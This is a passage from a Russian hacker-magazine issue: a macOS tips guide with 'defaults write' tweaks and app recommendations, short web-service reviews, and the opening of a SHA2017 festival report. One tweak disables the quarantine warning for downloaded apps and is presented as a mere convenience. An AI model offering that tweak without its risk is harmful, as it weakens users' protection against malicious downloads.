   «Закрыть» и «Скрыть остальные» вместо «Скрыть».
 • Некоторые функци ональные клавиши с  Alt вызывают соответству ющие
   настройки.  Например,  Alt‐F1  и  Alt‐F2 —  нас тройки  экрана  (так
   как F1 и F2 меняют яркость под светки), а Alt‐F3 — нас тройки Mission Con‐
    trol. Расположе ние может меняться в зависи мости от модели компьютера.




                        Главное пра вило при настройке системы: сна чала
                      про буй, потом думай и  толь ко потом  делай
                        по‐сво ему. Если не следовать ему, то велик шанс
                          что‐то упустить или испортить что‐то хорошее,
                        отдав пред почте ние ста рым при вычкам. Меняй
                          все, что хочешь, но сна чала убе дись, что в этом
                      действи тельно есть необходимость.



ЭКСКУРСИЯ ПО MACOS: ГДЕ ИСКАТЬ ВСЕ ИНТЕРЕСНОЕ
В Windows, как ты знаешь, все нас тройки ОС и прог рамм хранят ся в реес тре
либо в фай лах INI; в Unix большая часть нас троек лежит в /etc либо в скры тых
файлах в домашнем каталоге. Мно гое из того, что есть в Unix, присутс тву ет
и в macOS — есть и etc (точнее, private/etc, а etc — это теперь симлинк),
и при вычные скрытые фай лы в домашней пап ке.
  Настрой ки маков ских программ и более высокоуровневых час тей системы
лежат в двух других каталогах — /Library/Preferences и ~/Library/Pref‐
erences (точнее, /Users/имя_пользователя/Library/Preferences). В пер‐
вой — настройки для всех пользователей, во второй — для текуще го.





           Список фай лов с настройками уходит за горизонт

По пасть  в  пользователь скую  Library  на  свежеустановленной  системе
с некото рых пор стало не так прос то — нужно открыть Finder, выбрать в меню
«Переход → Переход к папке» (или нажать Cmd‐Shift‐G) и скопиро вать туда
адрес. Что бы этого лишний раз не делать, можно открыть терминал и выпол‐
нить команду


chflags nohidden ~/Library

Вот уже и первая скрытая настрой ка! Кста ти, корень дис ка удобно добавить
в сай дбар наряду с домашним катало гом: в нас трой ках Finder выбирай галоч‐
ку: «Боковое меню → Жесткие диски».
  Папок Unix ты здесь не уви дишь — они скрытые и по умолчанию вид ны
только из терминала, где в основном и нужны. Но если вдруг понадобится,
можешь выпол нить в терминале команду


defaults write com.apple.Finder AppleShowAllFiles YES

Те перь перезагрузи Finder («меню Яблоко → Завер шить принудительно →
Finder → Переза пус тить»), и ты уви дишь все скры тые файлы и папки.
  Но вер немся к изучению Library. Помимо пап ки Preferences, здесь пол но
все го интересного. К примеру, в LaunchAgents и LaunchDaemons лежат нас‐
тройки автозапуска по расписанию (launchd), в Application Support — базы
данных, плагины и прочие изменяемые части при ложе ний, в Services — сер‐
висы для обработки данных (см. пункт «Службы» в основном меню любой
программы), в Keychains — базы дан ных с твоими логинами и пароля ми
в зашифрованном виде, в PreferencePanes (только в корневой Library) — пла‐
гины «Сис темных настро ек», в Caches — всякий временный мусор и так
далее.





          В /Library мож но най ти мно го все го интерес ного

Также загляни в /System/Library. Лазить сюда часто тебе вряд ли при дется,
но изучить, из чего сделана macOS, не помеша ет. Можешь, например,
открыть папку Kernels и полюбовать ся на ядро или поинтересоваться ком‐
понентами системы в папке CoreServices.
  Полезно знать и то, что любая программа в macOS (включая системные
сервисы) — это папка, которую Finder отоб ража ет особым образом. По двой‐
ному клику она запускает ся, но, если хочешь заг лянуть внутрь, жми на нее
правой кнопкой мыши и выбирай «Показать содер жимое пакета». Тебе откро‐
ется много интересного!


КАК РАБОТАЕТ DEFAULTS
Большинство скрытых нас тро ек можно менять при помощи команды de‐
faults write. Но что это за загадочный defaults? Мы же уже выяс нили, что
все настройки лежат в пап ках Library, неужели где‐то еще есть аналог реес тра
Windows? На самом деле нет: параллелей с реес тром не избе жать, но de‐
faults — это всего лишь удоб ный спо соб быстро менять из командной стро ки
зна чения в файлах .plist (property  list — «списки свойств»), которые лежат
в Library/Preferences — корневой или пользовательской.
  К при меру, выпол нив команду из предыдущей главки и сделав в Finder
видимыми скры тые фай лы, ты всего лишь перезаписал значение AppleShow‐
AllFiles в ~/Library/Preferences/com.apple.finder.plist. Если у тебя
установлен Xcode (а установить его я рекомен дую всем пауэрюзерам незави‐
симо от желания писать прог раммы для «мака»), то ты сможешь открыть plist
в удоб ном редак торе, чтобы вручную найти и поменять любое значение.





            Любой plist мож но редак тировать в Xcode

Файлы plist могут быть разных типов. В новых версиях macOS появилась под‐
держка настроек в JSON, но большинство по‐прежнему хра нится в виде XML.
В обоих случаях такие plist можно откры вать и редактировать в любом тексто‐
вом редакторе. Но попадается еще бинарный формат, который можно про‐
читать при помощи утилиты из Xcode или декоди ровать командой plutil.
   Что до утилиты defaults, то она позволяет проделать еще нес коль ко инте‐
ресных трюков. Нап ример, если написать defaults read, то в терминал
будут вывалены вооб ще все нас тройки из сис темных папок. Они разбиты
на домены,  получить список  которых ты можешь командой defaults
domains. Теперь выбери интересу ющий тебя домен и напиши defaults read
название_домена, если хочешь получить только его содер жимое.





  Че го только не найдешь в Preferences. Это, к примеру, сейв игры
  «Тук‐тук‐тук»

При помощи defaults также мож но экспор тировать домены в другие файлы
и импорти ровать из них, а также искать по доменам. Все подробнос ти ты най‐
дешь при помощи man.


СКРЫТЫЕ НАСТРОЙКИ
С ранних времен macOS, еще в ее быт ность Mac OS X, энтузиас ты копали
содержимое Preferences в поисках интересных переменных и кол лекциони‐
ровали списки с найден ными ценностями.
   Луч шая из известных мне коллекций рас пространяется в виде файла
.macos, который предполагается кинуть в домаш ний каталог и выполнять
для первоначальной настройки системы (или чтобы вернуть к любимым нас‐
тройкам в любой момент).
  Я настоятельно не рекомен дую запускать этот файл всле пую —
ты отклю чишь много всего полезного, даже не зная об этом. Лучше скачай,
заком ментируй всё и вклю чай только то, что нужно, либо выбирай настрой ки
по одной и запускай по отдельности. Прой дем ся по наиболее инте ресным
опциям.
   Всег да раскры вать панель сохранения файлов:


defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode ‐
bool true
defaults write NSGlobalDomain NSNavPanelExpandedStateForSaveMode2 ‐
bool true

Вык лючить диалог под тверждения при открытии приложения:


defaults write com.apple.LaunchServices LSQuarantine ‐bool false

Отключить Notiﬁcation Center (панель, выезжающая справа) и спрятать значок:


launchctl unload ‐w /System/Library/LaunchAgents/com.apple.notifi
cationcenterui.plist 2> /dev/null

Назначить правый нижний угол трекпада как правую кнопку мыши:


defaults write com.apple.driver.AppleBluetoothMultitouch.trackpad
TrackpadCornerSecondaryClick ‐int 2
defaults write com.apple.driver.AppleBluetoothMultitouch.trackpad
TrackpadRightClick ‐bool true
defaults ‐currentHost write NSGlobalDomain com.apple.trackpad.trackp
adCornerClickBehavior ‐int 1
defaults ‐currentHost write NSGlobalDomain com.apple.trackpad.enable
SecondaryClick ‐bool true

Назначить пап ку для сохранения скрин шотов по Cmd‐Shift‐3 и Cmd‐Shift‐4:


defaults write com.apple.screencapture location ‐string "${HOME}/
Desktop"

Задать формат скриншотов (png можно заменить на jpg):


defaults write com.apple.screencapture type ‐string "png"

Вык лючить тень у скриншотов:


defaults write com.apple.screencapture disable‐shadow ‐bool true

Что бы изме нения вступили в силу, выполни еще killall SystemUIServer.




                     Су щес тву ет и быс трый  спо соб  сделать один
                       скрин шот без тени. Нажми Cmd‐Shift‐4, выбери
                         окно, нажми про бел и клик ни по нужному окну
                        с зажатой кнопкой Alt.


Но вые окна Finder будут показы вать рабочий стол (для других папок задай
параметр PfLo и путь в виде file:///full/path/here/):


defaults write com.apple.finder NewWindowTarget ‐string "PfDe"
defaults write com.apple.finder NewWindowTargetPath ‐string "file://
${HOME}/Desktop/"

Всегда показы вать рас ширения фай лов в Finder:


defaults write NSGlobalDomain AppleShowAllExtensions ‐bool true

При сор тировке по названию фай ла показы вать папки сверху:


defaults write com.apple.finder _FXSortFoldersFirst ‐bool true

Убрать пре дуп реждение, которое отоб ража ется при сме не расширения фай‐
ла:


defaults write com.apple.finder FXEnableExtensionChangeWarning ‐bool
false

Разрешить выделять  текст в окнах Quick Look (предпросмотр файлов
по нажатию на пробел):


defaults write com.apple.finder QLEnableTextSelection ‐bool TRUE;
killall Finder

Не создавать скрытую папку .DS_Store при работе с сетевыми папками (пер‐
вая коман да) и USB‐носите лями (вторая). При этом рас ширенные атри буты
файлов записывать ся тоже не будут:


defaults write com.apple.desktopservices DSDontWriteNetworkStores ‐
bool true
defaults write com.apple.desktopservices DSDontWriteUSBStores ‐bool
true

Убрать пре дуп реждение при очистке кор зины:


defaults write com.apple.finder WarnOnEmptyTrash ‐bool false

Разрешить AirDrop по Ethernet:


defaults write com.apple.NetworkBrowser BrowseAllInterfaces ‐bool
true

Убрать задержку при авто матичес ком скры тии дока:


defaults write com.apple.dock autohide‐delay ‐float 0

Убрать ани мацию при скрытии дока:


defaults write com.apple.dock autohide‐time‐modifier ‐float 0

Всегда целиком показывать URL в адресной строке Safari:


defaults write com.apple.Safari ShowFullURLInSmartSearchField ‐bool
true

По мимо этого, в фай ле .macos ты найдешь еще массу настроек, среди
которых есть как по‐настоящему скры тые опции, так и те, что доступны через
интерфейс. Здесь они нуж ны только для того, что бы автоматичес ки выс‐
тавлять их после пере установ ки системы.
   Раньше существовала неплохая утилита Secrets, а на ее сайте хра нилась
коллекция всех настроек. Увы, раз работ чик забросил свое тво рение и сай та
боль ше нет, зато есть исходники на GitHub. Так же существует блог defaults‐
write — на мой взгляд, сильно уступающий в удобс тве и пол ноте файлику
.macos.
  В любом случае ни на сайтах, ни в программах ты не найдешь ничего
такого, чего нет в пап ках Preferences.


ВЫБИРАЕМ СОФТ
Совето вать программы — дело непростое, у каждого свои инте ресы и пред‐
почтения. Но в чужом списке всег да можно выискать что‐то, что придется
по душе, и зачастую даже одна удачная рекомен дация может стать откры‐
тием,  которое  нехило поможет  в  работе. Я  опус тил  боль шую  часть
кросс‐плат форменного софта, который может быть известен тебе по другим
системам, и сосредоточился на маковских программах.




                   В последние годы были случаи, когда злоумыш‐
                       ленни кам удавалось добавлять вре доносный код
                        в репозитории извес тных опен сор сных программ
                       для «мака». Пострадали некоторые пользовате ли
                       HandBrake и Transmission (ссылки ведут на новос‐
                             ти). Будь начеку и, если есть возможность ска‐
                         чать программу из App  Store, а не с сайта,
                     выбирай App Store.





                                     Продолжение статьи →
PCZONE              ← НАЧАЛО СТАТЬИ



        МЕНЯЕМ СКРЫТЫЕ НАСТРОЙКИ,
           СТАВИМ ПОЛЕЗНЫЙ СОФТ И
          ЛЕЗЕМ ПОД КАПОТ СИСТЕМЫ,
                   ПЕРЕЙДЯ НА «МАК»





Замены стан дартным программам
Вместе с macOS идет неплохой набор стан дартных программ, большинство
из которых вполне при годно для ежедневного использования. Со временем
ты узнаешь, что в них гораздо больше возможностей, чем кажется на первый
взгляд, но иногда есть смысл все же заменить их на что‐то более прод‐
винутое.
  QuickTime → VLC. Совер шенно очевидная замена: VLC — это на данный
момент луч ший из все ядных видеоплееров для macOS (да и для других сис‐
тем тоже один из лучших). Одна ко не сто ит забывать и о QuickTime. У него,
к при меру, удобная функция записи аудио и скринкастов.
  Reminders → Things. Для «мака» есть огромное количество ту‐ду‐лис‐
тов и планировщиков, включая Wunderlist, Any.do, Clear и многие дру гие. Но я
рекомендую обратить внимание на новень кую третью версию Things — она
чудо как хороша.





                                  Things 3

Mail → Boxy. Если ты, как и я, поклонник Google Inbox, то Boxy — это удоб‐
ный способ сде лать из Inbox дес ктоп ное приложение. Но если Inbox тебе
не по душе, а Mail на что‐то заменить хочется, то можешь посмотреть Airmail
и Spark.
   Calendar → Fantastical. Ска зать по правде, до этой замены у меня
самого руки пока не дош ли: Fantastical сто ит денег, а календарем я поль зуюсь
лишь от слу чая к случаю. Однако восторженные отзы вы любите лей тщательно
планировать свой день говорят о том, что эту прог рамму не стыд но рекомен‐
довать. Кстати, те же разработчики недав но зарели зили Cardhop — аналогич‐
ную замену для адресной кни ги.
  Notes → Bear . Стандартные заметки Notes за последние годы ста ли зна‐
чительно луч ше, чем раньше, но разработчики Bear прев зошли тво рение
Apple. К тому же они ориентируются не на среднего пользователя, а на гика,
которому знакомо слово Markdown. Приложение бес платно, но за синхро‐
низацию с мобильными устрой ства ми просят 15 долларов в год.





                                Bear

Terminal → iTerm2 + Oh My Zsh. Когда‐то iTerm2 пре восходил стандар‐
тный  Terminal на две головы, но эти вре мена прошли. Тем не менее
iTerm2 по‐прежнему пользуется популярностью и имеет некоторые уникаль‐
ные фичи. А зачем менять bash на ZSH, читай в статье «Прокачай терминал!
Полезные трю ки, которые сделают тебя гуру консоли», все сказанное акту‐
аль но и для macOS.
   Calculator → Soulver . Я глубоко убеж ден, что программа‐калькулятор
не должна выглядеть, как карманный калькулятор. Soulver вмес то этого поз‐
воля ет набирать выражения в строчку, под держивает функции и поз воляет
ссылать ся из одной строки на результаты вычис лений в другой. Для еще
более сложных расчетов, перемежаемых тексто выми пояснениями, советую
глянуть Calca.
   Finder → Commander One. Лично я от двухпанельного файлового
менеджера отвык еще во времена Windows 95, но вполне понимаю людей,
которые упорно не хотят от него отка зывать ся. Commander One прек расно
удовлетворяет эту пот ребность — даже в бесплатной версии.


Расширения для системы
Пройдемся по самым интерес ным прог раммам из чис ла тех, которые добав‐
ляют в систему разные интересные функции или меняют стандартное поведе‐
ние интерфей са. Ставить их все разом, скорее всего, излишне, но ты навер‐
няка выберешь себе что‐нибудь по вкусу.
 • Alfred — это один из самых прод винутых лаунчеров, который, как и стан‐
   дартный Spotlight, поз воляет запускать прог раммы и искать файлы. В отли‐
   чие от Spotlight имеет массу плагинов и нас троек. Подробнее о нем я
   писал в статье «Лучшие лаунчеры для OS X».
 • FastScripts — прос тенькая ути лита, которая вытаскивает содержимое
   пап ки с поль зовательски ми скриптами в меню. После этого скриптам мож‐
   но задавать горячие клавиши, что поз воляет быстро вызывать при ложения
   и выполнять команды. Бесплатная версия имеет довольно демократич ное
   ограниче ние — до десяти шоткатов.
 • BitBar — удобная утилитка, которая дела ет две вещи: запус кает скрипты
   по расписанию (если не хочется ковыряться с правила ми launchd), а также
   выводит резуль таты их работы в меню. Идеаль но, когда надо быстро
   соорудить виджет.
 • Moom — утилита для управления раз мерами окон, которая работает
   не  толь ко  через  шот каты, еще  она  име ет  удоб ный  графический
   интерфейс. Для владель цев боль ших монито ров — незаме нимо. Как вари‐
   ант можешь посмотреть Magnet, Divvy и прочие альтернативы из моего
   старого обзора.
 • Spacious — одно время я использовал эту утилиту для навигации между
   рабочи ми сто лами при помощи покачивания колеси ка мыши. Мышь оста‐
   лась на старой работе, но было удобно.
 • ORFO — лучший спеллчекер для рус ского язы ка с кучей настроек. В сис‐
   тему встраивает ся как вли той. Минусы: недешев, и бывали случаи, ког да
   он вешал тексто вый редак тор. Но если серьезно относишься к правопи‐
   санию, то с этим при дется мирить ся.
 • Karabiner — жесткая низкоуровневая штука для переназначения клавиш.
  С ее помощью я назначил на Caps Lock вызов меню Moom (через эму‐
  ляцию отсутствующей на «маке» кноп ки Pause) и безмерно рад этой наход‐
   ке.
 • Yoink — забав ная утилита, которая показывает «кармашек», когда начина‐
  ешь что‐то перетаскивать. Туда можно положить то, что ты тащишь,
   а потом достать в дру гом месте. Облегчает работу и помогает дер жать
   рабочий стол в чистоте.
 • Copied — один из лучших менеджеров буфера обмена. Не только хра нит
   и позволя ет извлечь все, что ты копиру ешь, но и может синхро низи ровать
   данные с устройствами на iOS или по правилам добав лять в списки.




Раз уж речь зашла о FastScripts, то сразу хочу привести пару примеров скрип‐
тов, которые я один раз нас тро ил и использую постоянно. Один, самый прос‐
той,  открывает  панель  «Системные  нас тройки»  сочетанием  Cmd‐
Shift‐; — удоб но запом нить, посколь ку просто Cmd‐; вызывает нас трой ки
программы. Собственно, это даже не скрипт, а прос тая ссыл ка.
   Вто рое мое любимое сочета ние клавиш вызывает терминал с каталогом,
который был открыт в Finder. Найти скрипт ты можешь на сай те Red Sweater,
раз работ чика FastScripts, он называется Terminal At Selection (там же есть
под борка других инте ресных скриптов). Я добавил только &  ";  ls  ‐l"
в конец строч ки, которая начинается с do script "cd ".
   Третья штуковина, которой я хочу поделиться, — это скрипт, который
вешает на файлы в Finder цветные метки. Очень удобно повесить пару таких
на шоткаты и исполь зовать, ког да нужно отсортировать большой объем фай‐
лов.


 property file_color : 2
 tell application "Finder"
     activate
     set selected to selection
     repeat with n_file in every item in selected
         set label index of n_file to file_color
     end repeat
 end tell


Но мер цвета в начале можешь поменять: 0 — убрать метки, 1 — оранжевый,
2 — красный, 3 — желтый, 5 — фиолетовый, 6 — зеленый, 7 — синий.
  По теме маковского скриптинга можешь также посмотреть статью «Как
заставить Мак работать за тебя с помощью Automator и AppleScript» и мою
«Ав томати зируем OS X на Python».



Бе зопасность и раз работка
 • GPG Suite — набор утилит для удоб ной работы с шифрованием и клю‐
   чами OpenPGP. Есть пла гин для Mail и сервисы для быстрого шифрования
   и расшифров ки выделен ного текста.
 • 0xED — не самый навороченный, но удобный и бесплатный HEX‐редак‐
   тор. Всег да полезно иметь под рукой.
 • Tunnelblick — графичес кий интерфейс для работы с OpenVPN. Приложе‐
   ние не без странностей, но свое дело делает.
 • Sequel Pro для MySQL, PSequel для PostgreSQL и DB Browser  for
   SQLite — бра узе ры баз данных, все бес платные.
 • Dash — браузер документации, в который можно заг рузить кучу доков
   по всем языкам и фрей мворкам и быстро искать по ним. Легко интегри‐
   руется в популярные редакторы. Бесплатная версия имеет неприятную
   особен ность: то и дело заставляет ждать, прежде чем покажет то, что нуж‐
   но.
 • Tower — безого ворочно лучший Git‐клиент для «мака». Увы, недешев —
   80 бак сов.
 • Kaleidoscope —  надстройка  над  diﬀ  с  фантастически  кра сивым
   интерфей сом, которая, правда, и стоит фан тастичес кие для своей скром‐
   ной функции 70 долларов.





                             0xED

Что до выбора программистского редактора, то об этом можно вести бес‐
конечные спо ры и написать не одну статью. Помимо вездесущих Sublime Text,
VS Code и Atom, а так же про дуктов JetBrains, можешь глянуть Brackets,
BBEdit, Coda и легковес ный cotEditor. О том, как на «маке» жить с Vim, читай
в статье «Ре дак тор, из которого не вый ти. Как перестать бояться Vim и начать
его исполь зовать». Ну и конечно, ты всег да можешь использовать Xcode,
даже если не пишешь софт для «мака».


По лез ные в хозяйстве вещи
 • Cyberduck — бесплатный и вполне удобный клиент для FTP, SFTP, S3,
  WebDav и прочих фай лохранилищ. Если у тебя заваля лись лиш ние 45 дол‐
   ларов, то можешь вместо него взять Transmit — он более ско рос тной
   и приятный на вид.
 • Name Mangler — мощ ней шая ути лита для массового пере именовы вания
  фай лов. Нуж на не часто, и я успешно пользуюсь устаревшей, но бесплат‐
   ной второй вер сией. Кстати, рекомендую заглянуть на сайт фирмы Many
    Tricks — помимо Moom и Name Mangler, она делает еще пару интересных
   штук.
 • DaisyDisk — прог рамма, которая поможет тебе узнать, куда делось все
  место на диске. Но если не хочешь платить за это десять дол ларов, то
   твой выбор — это GrandPerspective.
 • Ukelele — редак тор клавиатурных рас кладок. Если вдруг решишь, что
   ни виндовая, ни маковская рас кладки тебе не по душе, можешь перекол‐
   басить клавиатуру на свой лад.
 • AppCleaner — ути лита для удаления приложе ний со всеми нас тройками
   и кешами. Обычно дос таточно стереть программу из папки Applications,
   а настройки и базы — из ~/Library/Application Support , но бывают
   более запущенные случаи.


Просто хорошие программы
Вообще, прекрасный софт для меня был одной из причин перехода на «мак».
И все го, конеч но, не упо мянешь — для каждого вида твор чества есть свои
инструменты. Нап ример, если ты соберешь ся писать книгу, то обязательно
пос мотри Ulysses и Scrivener, а если будешь работать с картинка ми и не
хочешь платить за Photoshop — глянь Pixelmator (кстати, скоро вый дет версия
Pro), Acorn и редакторы из серии Aﬃnity.





                                  Pixelmator

Для рисования диаг рамм есть OmniGraﬄe, да и дру гие продукты Omni Group
достойны  вни мания.  Из  уни версально  полезного  могу  посоветовать
еще Reeder (агре гатор RSS) и Byword (клон iA Writer с более удобным счет‐
чиком знаков), которыми сам ежед невно пользуюсь.




Apple делает для Apple TV впе чатляющие скрин сейверы с замедленны ми
съем ками с квадрокоптера, пролетающего над городами и прочими живопис‐
ными местами. Умельцы, перехватив трафик приставки, нашли ссыл ки,
по которым можно получить эти видео, а затем сделали скринсейвер
для macOS, который ты можешь скачать и установить.





Ну и конечно, нельзя не вспомнить колоссальную коллекцию скринсейверов,
пос троенных на осно ве XScreenSaver. Его в качес тве хобби поддерживает
Джейми Завин ски — один из авторов Netscape, известный в числе прочего
благодаря своему бло гу. Мне, в час тнос ти, нравит ся скринсей вер BSOD,
который эмулирует экра ны смерти разных компьютеров и ОС. Опасай ся: сто‐
ит пос тавить эту шту ку, как ты о ней забываешь, а потом пугаешься, уви дев
на экра не сообщения об ошиб ке.
PCZONE





                       Андрей Письменный
                         Шеф‐редактор
                           apismenny@gmail.com



      WEBSDR — САЙТ, КОТОРЫЙ ОТКРОЕТ ДЛЯ ТЕБЯ МИР
      ПРОГРАММНЫХ РАДИО1        Го ворят, стоит толь ко прикоснуть ся к теме SDR (программно опре‐
        деляемого радио), как проваливаешься в нее с головой и начина‐
       ешь скупать раз ное железо и шаманить с ним. Если тебя не испу‐
        гало это предупреждение, то сайт WebSDR.org пос лужит тебе
        отличной отправной точкой. Благодаря ему ты можешь поиграться
        с SDR, ничего не покупая и не настра ивая, а также пой мать радио,
        находящееся за половину мира от тебя.





      Мы уже писали о замечательном сервисе Radio Garden, который
        позволяет слушать радио из раз ных точек мира. Но если Radio Gar‐
        den — это список офи циальных стри мов радиостанций, то на WebS‐
      DR собирают совсем дру гое — адреса серверов, к которым под‐
        клю чены SDR — платы, которые способны захватывать разом целый
        диапазон частот (или сразу несколько). Под робнее о них читай
        в теме номера Ха кера №177.
         Выбрав одну из пользовательских станций, ты можешь сам пок‐
         рутить ручку приемника и поискать что‐нибудь интерес ное. Для это‐
         го есть масса всяких средств настройки и визуали зации сигнала
         (доступны версии для HTML5 и в виде апплета на Java). Есть даже
          чат,  в  котором мож но  пооб щаться  с  другими  слушателями
        и поделиться наход ками.





        Ав тор сервиса расска зывает, что впер вые запус тил его, чтобы
        делить ся стримом ради ообсерва тории Двингело между универ‐
         ситетами, но потом оказалось, что есть желающие поставить сервер
      WebSDR у себя, что бы тран слировать в интернет захватываемый
        ради оэфир. Сер верный софт можно поп росить у владель ца WebS‐
         DR.org, написав ему по почте. Каждый, кто запускает его у себя,
        автомати чески попада ет в каталог на сай те.


       FRANCHISE — УДОБНЫЙ ВЕБ-СЕРВИС ДЛЯ РАБОТЫ С
      БАЗАМИ ДАННЫХ2   Что нужно, что бы быс тро заг лянуть в базу данных и най ти там
        что‐нибудь? Можно написать зап рос из командной строки, исполь‐
        зовать десктопный клиент или на скорую руку добавить страницу
          к веб‐приложе нию. Раз работчики Franchise предлагают еще один
        способ — восполь зоваться их готовым вебовым клиентом.





       Откры ваем Franchise, переходим к приложе нию и можем либо заг‐
         рузить файл с базой (если это SQLite или BigQuery), либо вбить
        адрес базы в интернете, а так же логин и пароль пользовате ля. Если
       СУБД работает на десктопе, то для соединения понадобит ся пос‐
         тавить Node.js и клиентское приложение Franchise.
          Если соединение прошло успешно, можешь начинать писать зап‐
       росы на SQL и смот реть результаты. Помимо таб лиц, которы ми вряд
        ли кого‐то удивишь, есть карточки (их мож но быстро пролис тывать
        при помощи ползунка), карты (на случай, если запрос возвра щает
       пары коор динат), а также гра фики — линейные, гистограм мы и диаг‐
       раммы рассеяния. Также результаты зап роса можно выгрузить
        в виде CSV, XLS или JSON.





        Большое достоинс тво Franchise в том, что на одной странице можно
        дер жать сразу мно го зап росов с результатами. Поэто му разработ‐
        чики и называют свой сервис «блокнотом для баз данных». Это поз‐
        воляет сохранить всю исто рию исследова ния или даже сделать
        себе что‐то вроде даш борда — чтобы в любой момент поглядывать
        на статистику по актуаль ным данным.
         Не хочешь доверять свои данные стороннему приложению?
       Это вполне резон но. Возможно, тебе пон равится, что его исходники
        опуб ликованы на GitHub и при желании можно поставить и запустить
        локальную копию (будут нужны Node.js и Yarn).

      BASE ־ — КОДИРОВЩИК, КОТОРЫЙ ШИФРУЕТ ТЕКСТ ПРИ
     ПОМОЩИ ЭМОДЗИ3       Существует удоб ный и повсеместно используемый способ переда‐
         вать двоичные дан ные в тексто вом виде — он называется Base64.
        Автор ути литы Base ־ решил раз влечь ся и сде лать аналог, который
        прев ращает любые данные не в текст, а в эмодзи.
          Base ־ — это ути лита командной стро ки, которая работает ана‐
        логично Base64: в stdin идут исходные данные, из stdout приходит
      шифровка из эмодзи. Все предельно просто. Слож ность — это убе‐
        дить себя в том, что тебе нужен Rust, чтобы собрать шиф ровальщик
         текста в эмодзи. Ведь бинарных вер сий автор пока не пре доставля‐
          ет.
           Кстати, если тебе понравится эта утилита, то обязательно обрати
        внимание на Emojicode — язык программирования, в котором все
        конструкции записы вают ся при помощи эмодзи. Автор «Хакера»
        подробно разобрал его в статье «Виноград безумия. Программи‐
        руем без букв на Emojicode» и даже написал на Emojicode интерпре‐
        татор языка Brainfuck.
        И раз уж речь заш ла о кодировании странными способами,
        поделюсь ссылкой на чуть более полезный проект — он называ ется
        Base65536 и исполь зует для кодиро вания весь набор символов
        UTF‐32. После его при менения стро ка «hello world» (одиннадцать
       символов) прев ращается все го в шесть знаков, сре ди которых —
        иероглифы и даже клинопись.
          Автор Base65536 прес ледовал благородную цель шей рить через
           Twitter записи игр в Hatetris — версию «Тет риса», в которой игроку
        выпадает   ста тистически   худшая  последовательность   фигур,
        из которых невоз можно собрать плотную стену.
          Что ж, доб ро пожало вать в жес токий мир прог раммистских при‐
         колов!
СЦЕНА





РЕПОРТАЖ С САМОГО ЯРКОГО ХАКЕРСКОГО
         ИВЕНТА ЭТОГО ЛЕТА





                                         Олег Архонов
                                                   Telegram: @archon
                                               archonoff@gmail.com





Still Hacking Anyway 2017 — это фес тиваль, на котором соб‐
рались четыре тысячи хакеров со все го мира и в течение
пяти  дней  развле кались самыми  разными  способа ми:
от непос редс твенно взло ма до катания на картонных лодках.
SHA произво дит неиз гладимое впечатление, которым я
попытаюсь здесь поделиться.


Пом ню, как в 2001 году  я, тогда четырнадца тилетний школьник, лис тал
«Хакер»  и  нат кнулся  на  статью  Дани  «Твоя  тусовка  2001»   (но мер
за июль 2001 года, с. 22), в которой он рассказывал про раз ные хакерские
сбо рища. Среди них был и HAL2001.
  Я тог да подумал: «Вот оно. Сюда я неп ременно дол жен поехать» (ну
конечно — в четырнадцать лет такой встал, собрал чемодан, прихватил пач ку
гульденов и отправил ся в Голландию). Разуме ется, я никуда не поехал. Затем
мимо меня пролетели WTH в 2005 году, HAR в 2009‐м и OHM в 2013‐м,
поэтому пропустить SHA2017 я уже просто никак не мог.





                 Неофи циаль ное лого фестиваля


ЧТО ТАКОЕ SHA
SHA2017 (Still Hacking Anyway) собрал в этом августе в пятидесяти километрах
от Амстердама четыре тысячи хакеров, фрикеров, программистов и инже‐
неров со всех концов света. По утвержде нию организаторов, присутство вало
порядка пятиде сяти национальностей. Пять дней подряд все эти люди тусили,
кодили, паяли, развлекались, слушали доклады  и, конечно, ломали всё,
до чего могли дотянуться.
   Удивительно, что при таком масшта бе это некоммерческое мероприятие
пол ностью организуется силами волонтеров (или, как их называли на самом
ивен те, ангелов). Стать одним из них мог любой посетитель кем па, за что,
кроме чувства причастности, можно получить фир менную футболку.





                     Ре ка кишит крокоди лами

Вся прелесть SHA2017 в том, что здесь каждый может найти занятие по душе.
Хочешь слушать доклады? Добро пожаловать на лекции с десяти утра и до
две надцати ночи. Нравится железо и электро ника? Воркшопы с паяльными
станциями к твоим услугам. Не терпится покодить? Можно с комфортом раз‐
местить ся в гамаке в уютном чила уте. Хочешь ломать серваки? Интернет пов‐
сюду, а сканировать сеть на канале в 10 Гбит — сплош ное удовольствие.
Любишь тусить? Ночью территория кем па прев раща ется в настоящий фес‐
тивальный опен‐эйр с морем пива, грап пы, веселья и лазерных лучей.
  Офи циальная образователь ная прог рамма мероприятия сос тояла из лек‐
ций, док ладов и воркшопов, которые параллельно читались сра зу в шести
тентах. Два самых круп ных тента вмещали пару тысяч человек.





  Уильям Бинни рас сказыва ет, почему тайна личной жизни — это пережи ‐
  ток прошлого

Можно было услышать от бывшего технического директора NSA (который
называл свою быв шую работу New Stasi Agency), как это агентство за нами
следит; узнать, что электро механические замки в Германии можно открыть
при помощи батарей ки и двух проводков; научить ся перехватывать тра фик
и про водить MitM‐атаку на Bluetooth‐устрой ства с низ ким энергопотребле‐
нием (BLE); понять, станет ли про рыв в квантовой физике проклятием
для крип тографии, а также насладиться огромным количеством дру гих инте‐
реснейших выступлений (см. врез ку в конце статьи).
  Кроме того, что почти со всех площадок ивента велась пря мая трансля ция
докладов, их виде оза писи появлялись букваль но в счи таные часы пос ле
завершения самого доклада, причем пол ностью смонтированные, с записью
сце ны с несколь ких камер, а также прямой записью пре зентации с ноутбука
докладчика.





            Некоторые доклады были интерес нее других


КЕМП НОЧЬЮ
Но не за докладами стоило ехать на SHA, ох не за докладами… Пока пос‐
ледние спи керы отве чали на воп росы немногочис ленной аудитории, я шел
к центру сборища и понимал, что тер ритория кемпа неузнаваемо пре обра‐
зилась. Теперь она боль ше походи ла на то, что обычно показывают в филь‐
мах про хакеров.
   Толь ко представь: вокруг бродят странные лич ности, обве шанные све‐
тоди одами, мимо на бешеной ско рости про носят ся моторизован ные диваны
и крес ла с сидящи ми на них пилота ми, в тентах громыхает музыка, а из‐за
работа ющих дым‐машин внут ри не видно даже собс твенный локоть. Когда
в этом Сайлент Хилле врубают стробоскопы, мозг уже натурально перестает
ориентироваться в прос транс тве и утра чива ет контакт с реальностью; дым
про низы вают лазерные лучи, и все это укра шают вспо лохи пламени огне‐
метов, установленных на вышках. Если бы я не видел это собственными гла‐
зами, то ни за что не поверил бы, что такое бывает в реаль ности.





  Вид с высоты не передает ощущений, которые испытываешь, находясь
  внутри. Фото — Sebastian Humbek





          Вышка с огнеметом. Фото — Sebastian Humbek





                         Пог ладь кошечку!


